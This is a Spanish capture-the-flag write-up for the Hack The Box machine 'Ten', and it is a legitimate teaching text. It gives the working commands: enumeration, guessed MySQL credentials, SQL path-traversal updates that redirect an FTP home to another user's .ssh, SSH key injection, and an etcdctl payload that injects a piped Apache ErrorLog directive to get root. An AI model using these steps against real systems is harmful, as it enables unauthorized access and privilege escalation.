# HTB - Ten Writeup

**Autor:** TRNNSK
**Dificultad:** Hard
**Sistema:** Linux

---

# Resumen

La máquina **Ten** simula un entorno de shared-hosting mal configurado. Vamos a abusar de un portal de registro FTP que provisiona cuentas con credenciales MySQL débiles, manipular la base de datos para redirigir el directorio FTP al `.ssh` de otro usuario e inyectar nuestra clave pública SSH para obtener acceso como `tyrell`. Para escalar a root, envenenamos la configuración de Apache a través de etcd — que remco monitoriza y recarga como root — inyectando una directiva `ErrorLog` maliciosa que copia nuestra clave SSH al directorio root.

---

# Enumeración

## Escaneo inicial

```bash
nmap -Pn -A --top-ports 3000 ten.vl
```

### Resultados:

```
21/tcp open  ftp  Pure-FTPd
22/tcp open  ssh  OpenSSH 8.9p1
80/tcp open  http Apache httpd 2.4.52
```

---

# Análisis Web

Al acceder al puerto 80 se presenta un portal de hosting gratuito llamado **Ten**. La funcionalidad principal permite registrar un dominio y obtener credenciales FTP automáticamente.

## Fuzzing de vHosts

```bash
wfuzz -H "Host: FUZZ.ten.vl" -w ~/wordlists/raft-medium-words.txt --hw 25 --hc 400 -t 100 http://ten.vl
```

Se descubre un subdominio adicional: `webdb.ten.vl` — un portal de administración de MySQL.

---

# Foothold — MySQL + FTP Path Traversal → SSH Key Injection

## Paso 1 — Registro y acceso FTP inicial

Se registra un dominio de prueba y se obtienen credenciales:

```
Username: ten-1481960f
Password: 873911d5
Personal Domain: testing.ten.vl
```

```bash
echo '10.129.234.149 testing.ten.vl' >> /etc/hosts
ftp ftp://ten-1481960f:873911d5@testing.ten.vl
```

## Paso 2 — Acceso a MySQL via webdb.ten.vl

En `webdb.ten.vl` se usa la función **Guess Credentials** que encuentra:
- `user:pa55w0rd`

Se conecta a la base de datos `pureftpd` y se ve la tabla `users` con el directorio asignado al usuario FTP (`/srv/ten-1481960f/./`), UID y GID.

## Paso 3 — Path Traversal para enumerar el sistema

Se modifica el directorio en MySQL a `/srv/home` y al reconectar via FTP se puede navegar por el sistema de archivos. Se descarga `/etc/passwd` y se identifica el usuario `tyrell` con UID/GID `1000`.

## Paso 4 — Manipulación de MySQL para acceder al .ssh de tyrell

Primer intento — path directo (falla porque el directorio no existe bajo `/srv/`):
```sql
UPDATE users SET dir='/srv/home/tyrell', uid='1000', gid='1000' WHERE user='ten-1481960f';
```

Segundo intento — path traversal (funciona):
```sql
UPDATE users SET dir='/srv/../home/tyrell', uid='1000', gid='1000' WHERE user='ten-1481960f';
```

Al reconectar se accede al home de `tyrell` pero no se puede hacer `cd .ssh` porque FTP prohíbe rutas con `.`.

Tercer intento — apuntar directamente al directorio `.ssh`:
```sql
UPDATE users SET dir='/srv/../home/tyrell/.ssh', uid='1000', gid='1000' WHERE user='ten-1481960f';
```

## Paso 5 — Inyección de clave SSH

```bash
# Genera keypair
ssh-keygen -t ed25519 -f testing

# Copia la clave pública como authorized_keys
cp testing.pub authorized_keys

# Sube via FTP al .ssh de tyrell
ftp ftp://ten-1481960f:873911d5@testing.ten.vl
ftp> put authorized_keys
```

## Paso 6 — SSH como tyrell

```bash
ssh -i testing tyrell@ten.vl
```

Flag de usuario:
```bash
cat /home/tyrell/user.txt
```

---

# Escalada de Privilegios — etcd + remco → Apache ErrorLog Injection

## Identificación

Revisando el código fuente de `get-credentials-please-do-not-spam-this-thanks.php` se descubre que el portal usa `etcdctl` para crear entradas en etcd cuando se registra un dominio:

```php
system("ETCDCTL_API=3 /usr/bin/etcdctl put /customers/$username/url " . $_POST['domain']);
```

Con `pspy` se observa que cuando se crea un usuario, además de `etcdctl`, también se ejecuta `remco` como **root**, que recarga Apache:

```
UID=0 | /usr/local/sbin/remco
UID=0 | /bin/sh -c systemctl restart apache2.service
```

`remco` monitoriza las claves de etcd bajo `/customers/*` y usa una plantilla para generar `/etc/apache2/sites-enabled/010-customers.conf`. Cuando detecta cambios, recarga Apache como root.

La plantilla genera configuraciones de VirtualHost:
```
<VirtualHost *:80>
    ServerName {{ url }}.ten.vl
    DocumentRoot /srv/{{ customer }}/
</VirtualHost>
```

## El vector — Apache ErrorLog con pipe

Apache permite que la directiva `ErrorLog` ejecute comandos cuando el path empieza con `|`:
```
ErrorLog "|/comando/a/ejecutar"
```

Como el valor `url` de etcd se inserta directamente en la configuración de Apache sin sanitizar, podemos inyectar una directiva `ErrorLog` maliciosa.

## Explotación

Se confirma que `tyrell` puede escribir en etcd:
```bash
ETCDCTL_API=3 /usr/bin/etcdctl put /customers/ten-29ee00eb/url privesc_test
```

Se verifica que la configuración de Apache se actualizó correctamente. Luego se lanza el payload malicioso:

```bash
ETCDCTL_API=3 /usr/bin/etcdctl put /customers/ten-b94344ef/url 'asdfasdfasdf.ten.vl
 ErrorLog "|/usr/bin/cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys"
#'
```

Cuando `remco` detecta el cambio y Apache recarga la configuración como root, ejecuta el comando del `ErrorLog` — copiando la clave SSH autorizada de `tyrell` al directorio de root.

```bash
ssh -i testing root@ten.vl
cat /root/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap — FTP, SSH y HTTP
2. Registrar dominio en el portal y obtener credenciales FTP
3. Fuzzear vHosts con wfuzz — encontrar `webdb.ten.vl`
4. Usar Guess Credentials en webdb para acceder a MySQL con `user:pa55w0rd`
5. Ver la tabla `users` de pureftpd y el directorio asignado al usuario FTP
6. Modificar el directorio FTP en MySQL a `/srv/home` para navegar el filesystem
7. Descargar `/etc/passwd` y encontrar usuario `tyrell` con UID/GID 1000
8. Usar path traversal en el directorio MySQL para acceder al `.ssh` de tyrell
9. Generar keypair SSH y subir `authorized_keys` via FTP
10. SSH como `tyrell`
11. Revisar código fuente del portal — descubrir uso de `etcdctl`
12. Monitorizar procesos con pspy — identificar `remco` corriendo como root
13. Verificar que `tyrell` puede escribir en etcd
14. Inyectar directiva `ErrorLog` maliciosa via etcd para copiar authorized_keys a /root/.ssh
15. SSH como root

---

# Conclusión

Esta máquina demuestra cómo:

- Un portal de shared-hosting con MySQL accesible permite manipular la configuración de cuentas FTP para obtener acceso arbitrario al sistema de archivos
- La integración débil entre MySQL y FTP permite path traversal en los directorios de las cuentas, posibilitando escritura en directorios sensibles como `.ssh`
- Los sistemas de gestión de configuración como remco/etcd que se ejecutan como root y consumen datos de usuarios sin sanitizar son vectores críticos de escalada
- La directiva `ErrorLog` de Apache con pipe permite ejecución de comandos arbitrarios cuando un proceso root recarga la configuración

---

y ya
